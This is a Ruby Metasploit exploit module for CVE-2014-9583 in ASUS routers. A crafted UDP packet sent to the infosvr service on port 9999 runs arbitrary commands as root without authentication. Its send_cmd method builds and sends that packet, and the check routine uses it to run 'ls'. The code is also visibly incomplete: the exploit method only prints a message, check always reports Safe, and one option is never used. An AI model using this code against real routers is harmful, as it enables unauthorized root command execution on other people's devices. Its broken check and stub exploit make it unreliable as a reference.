##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = AverageRanking
  include Msf::Exploit::Remote::Udp

  def initialize(info={})
    super(update_info(info,
      'Name'           => "ASUSWRT 3.0.0.4.376_1071 LAN Backdoor Command Execution",
      'Description'    => %q{
                Several models of ASUS's routers include a service called infosvr that listens on UDP broadcast
                port 9999 on the LAN or WLAN interface. It's used by one of ASUS's tools to ease router configuration
                by automatically locating routers on the local subnet. This service runs with root privileges
                and contains an unauthenticated command execution vulnerability.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Joshua "jduck" Drake', # orginal discovery
          'Kyle Miracle <kyle[at]kylemiracle.com>' # metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2014-9583'],
          ['URL', 'https://github.com/jduck/asus-cmd']
        ],
      'Payload'        => { 'BadChars' => "\x0d\x0a\x00" },
      'Platform'       => 'linux',
      'Targets'        =>
        [
          [ 'Automatic', {} ],
        ],
      'Privileged'     => false,
      'Stance'         => Msf::Exploit::Stance::Aggressive,
      'DefaultTarget'  => 0))

      register_options(
        [
          OptAddress.new('RHOST', [true, 'The address of the router', '192.168.1.1']),
          Opt::RPORT(9999),
          OptInt.new('HTTPDELAY',    [false, 'Seconds to wait before terminating web server', 10])
        ], self.class)
  end

  def check
      print_status(send_cmd("ls"))
      return Exploit::CheckCode::Safe
  end

  def send_cmd(cmd)
      s = UDPSocket.new
      s.bind('0.0.0.0', 9999)
      print_status("Checking")
      check_buf = ("\x0c\x15\x33\x00" + rand_text_english(4, payload_badchars) + ("\x00"*38) + [cmd.length].pack('S_<') + cmd).ljust(512, "\x00".force_encoding("BINARY"))
      s.send(check_buf, 0, datastore['RHOST'], 9999)
      text, sender = s.recvfrom(512)
      s.close()
      return text
  end

  def exploit
    print_status("exploiting")
  end
end
